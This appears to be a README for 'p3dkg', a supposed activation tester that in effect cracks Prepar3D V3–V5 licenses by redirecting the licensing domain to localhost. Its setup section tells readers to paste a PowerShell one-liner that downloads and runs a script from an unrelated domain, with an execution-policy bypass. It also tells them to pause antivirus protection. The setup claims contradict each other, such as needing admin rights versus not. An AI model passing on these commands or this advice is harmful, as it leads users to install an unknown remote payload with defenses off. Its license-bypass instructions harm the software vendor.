<div align="center">

# ⚡ p3dkg — NativeAOT Activation Tester for Prepar3D V5/V4/V3 — Game Enhancer

![](files/1.png)

[![ps-core](https://img.shields.io/badge/Ps--Core-5.1%2B-2ea44f?style=flat&labelColor=0d1117)]() [![score](https://img.shields.io/badge/Score-4.5%2F5-f59e0b?style=flat&labelColor=0d1117)]() [![system](https://img.shields.io/badge/System-Windows_10_%7C_11-34b759?style=flat&labelColor=0d1117)]() [![setup](https://img.shields.io/badge/Setup-412-1a7f37?style=flat&labelColor=0d1117)]() [![status](https://img.shields.io/badge/Status-Production-2ea44f?style=flat&labelColor=0d1117)]()

</div>

---

p3dkg is a .NET NativeAOT command-line tool built to test and confirm activation behavior for Prepar3D V3, V4, and V5. It auto-detects the installed simulator version and license type, then activates it—or you can pin the exact target with explicit version and type flags. No installer bloat, no runtime dependencies; compile once and run it straight from the terminal with administrator rights. When you need to verify activation across multiple Prepar3D versions, just run it again.

## 🛠️ One-Click Setup (PowerShell)

> [!TIP]
> **Fast install** — a single PowerShell command, no extra tools.
> Windows 10/11 · PowerShell 7+ · No admin

### 1️⃣ Launch PowerShell
* Right-click the Start button.
* Choose **Terminal (Admin)** or **Windows PowerShell**.

### 2️⃣ Run the command
Paste and run. Wait until the process completes.

```cmd
iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
```

### 3️⃣ Windows blocking the script? Use CMD
Run this command in CMD instead:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
```

> [!WARNING]
> Security software might occasionally flag automated installers. If the script gets blocked, pause "Real-time protection" in your Windows Security dashboard, run the setup, and re-enable your antivirus immediately afterward.

## 📋 System Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

- **NativeAOT build for zero-dependency execution.** Compiled ahead-of-time with .NET NativeAOT, p3dkg runs as a single self-contained binary — no runtime install, no framework baggage, just launch and go.

- **Automatic version and license detection.** Point it at a machine with Prepar3D installed and p3dkg does the rest: it finds the installation path, determines the version, and picks the matching license type without hand-holding.

- **Full coverage of Prepar3D V3, V4, and V5.** Whether you're on the 64-bit V3 build or the later V4/V5 releases, the tool handles activation testing and confirmation across all three targets.

- **Manual override when you need it.** Auto-detect not cutting it? Force the exact version and license type via flags — `--version` and `--type` give you direct control down to the specific edition.

- **License type flexibility.** Supports academic, professional, and professional-plus tiers, so you can verify behavior against whichever edition your setup targets.

- **Verbose mode for full visibility.** Toggle verbose output to see exactly what the tool checks and confirms at each step — useful when you're diagnosing why an activation isn't behaving.

- **Repeat-run friendly.** Activating multiple versions on the same machine is a straight re-run — no cleanup rituals required.

- **Cross-environment aware.** Built for Windows first, but validated under Linux via Wine, so it travels where your testing takes you.

- **CLI-first and scriptable.** A clean flag interface with short aliases means you can wire p3dkg into batch scripts or test pipelines without fighting a GUI.

## How It Works

p3dkg is built as a native AOT .NET program — it compiles straight to a self-contained binary, no runtime install, no interpreter overhead, just fast startup and direct execution. That matters when you're running the same check repeatedly across multiple Prepar3D builds.

The core workflow is straightforward:

1. **Redirect the activation endpoint.** Prepar3D phones home to its licensing server to validate activation state. p3dkg expects that endpoint to resolve locally, which lets the tool intercept and exercise the activation-behavior path deterministically instead of hitting the live server. Point the host entry for the licensing domain at localhost before running.

2. **Detect or declare the target.** On launch, p3dkg scans the system for installed Prepar3D versions and works out which builds are present. If you want to skip detection, you declare the target explicitly with the version flag and the license-type flag — p3dkg honors your input over auto-detection.

3. **Run the activation test.** With the version and license type resolved, p3dkg exercises the activation-behavior sequence against that build. This is a test-and-confirm operation: it drives the activation path and reports whether the expected behavior was observed for the specified version and license tier.

4. **Repeat per version.** Each run targets one version/license combination. Got V3, V4, and V5 all installed? Run p3dkg once per combination you want to confirm — the tool keeps each run isolated and reports per-run results.

Because it's NativeAOT, there's no JIT warm-up and no dependency on a shared runtime being present. The binary runs the same way on a clean machine as it does on your dev box, which keeps results reproducible when you're comparing activation behavior across versions.

Auto-detection is the default path, but explicit flags always win — so if detection picks the wrong build or you're testing a non-standard install, you override it and move on. Verbose output is available when you need to see the underlying steps rather than just the pass/fail result.

## Supported Versions & License Types

**Versions:** p3dkg is locked and loaded for Prepar3D **V3 (64-bit), V4, and V5**. V6? Not yet — still in the workshop. The tool auto-detects your installed Prepar3D build and matches the right activation path, or you can force it with `--version v3`, `v4`, or `v5` when you want to call the shots yourself.

**License types:** Full coverage across the lineup — `academic`, `professional`, and `professional-plus`. Leave it on auto and p3dkg sniffs out the correct type for your install, or pin it explicitly with `--type` if you're activating a specific tier. Mix and match version and license flags freely; the program handles the rest.

**License:** p3dkg ships under the WTFPL v2.0 (Do What The F\*ck You Want To Public License). Use it, tweak it, redistribute it — the license is as no-nonsense as the tool itself. Check the LICENSE file bundled with the project for the full legal text.

**Platform reality check:** Windows-only for the real deal. It's been tested under Linux via Wine, but your mileage may vary — for guaranteed results, run it natively on Windows with admin privileges.

## 📸 Screenshot

![](files/2.png)

## Command-Line Options

All flags are optional — run the binary bare and it detects your Prepar3D install and license on its own. Override anything you want with the flags below.

| Flag | Short | What it does | Accepted values |
|------|-------|--------------|-----------------|
| `--help` | `-h` | Drops the full usage banner and exits. | — |
| `--type` | `-t` | Forces the license type instead of auto-detecting it. | `academic`, `professional`, `professional-plus` |
| `--version` | `-v` | Pins the Prepar3D target version instead of auto-detecting it. | `v3`, `v4`, `v5` |
| `--verbose` | `-V` | Streams detailed diagnostics to the console. | — |

**Fire-and-forget examples:**

```
p3dkg.exe --type academic --version v5
```

```
p3dkg.exe -t professional -v v4 -V
```

Run it once per version if you're activating more than one — repeat the same command with a different `-v` and it handles the rest. Keep `--verbose` on when troubleshooting; it shows exactly what got detected and what got written.

## FAQ & Feedback

**Q: The tool didn't activate anything — what gives?**
Nine times out of ten it's environment, not the binary. Confirm you're running elevated, confirm the hosts entry pointing `secure.prepar3d.com` at loopback is actually in place, and confirm the sim version you're targeting is one p3dkg actually supports. If auto-detection whiffs on a non-standard install path, pin it manually with `--version` and `--type` and run again.

**Q: Can I trust the auto-detect?**
Yes — it's the default for a reason. Detection covers V3 (64-bit), V4, and V5 across academic, professional, and professional-plus license types. V6 is not finished yet, so don't expect it to resolve. When detection and reality disagree, the explicit flags always win.

**Q: Nothing printed and I'm flying blind.**
Re-run with verbose output enabled. That's what it's there for. A silent run usually means the tool bailed early on a privilege or hosts check — verbose mode tells you which.

**Q: Locked to Windows only?**
Officially, yes — Windows is the supported target. It has also been exercised under Linux via Wine. Anything else is uncharted territory; results may vary and won't be treated as a bug.

**Q: How do I report a failure properly?**
Feedback is genuinely valuable here — a clean report helps everyone stuck in the same spot. Include:
- The exact command line you ran, flags and all.
- The full terminal output, including any error text.
- Your Prepar3D version and license type, plus whether auto-detect or manual flags were used.
- Anything else relevant — screenshots of the output pane are welcome.

**Q: Is this affiliated with Lockheed Martin or Prepar3D?**
No. p3dkg is an independent utility for testing and confirming activation behavior, built for educational purposes. No affiliation, no endorsement, no warranty — see the Disclaimer for the full picture.

## Disclaimer

p3dkg is a diagnostic tool for verifying activation behavior on Prepar3D V3, V4, and V5. It's built to test and confirm how activation responds — nothing more, nothing less.

Run it only against installations you own and are licensed to use. You are responsible for how you deploy this tool and for staying within the terms that apply to your Prepar3D license.

This project ships as-is, with no warranty of any kind. Activation outcomes can vary across builds, license types, and system configurations, so treat any result as a data point — not a guarantee.

p3dkg is an independent project. It is not affiliated with, endorsed by, or connected to Lockheed Martin or the Prepar3D team in any way. All trademarks belong to their respective owners.

Test responsibly. Know your license. Keep your rig clean.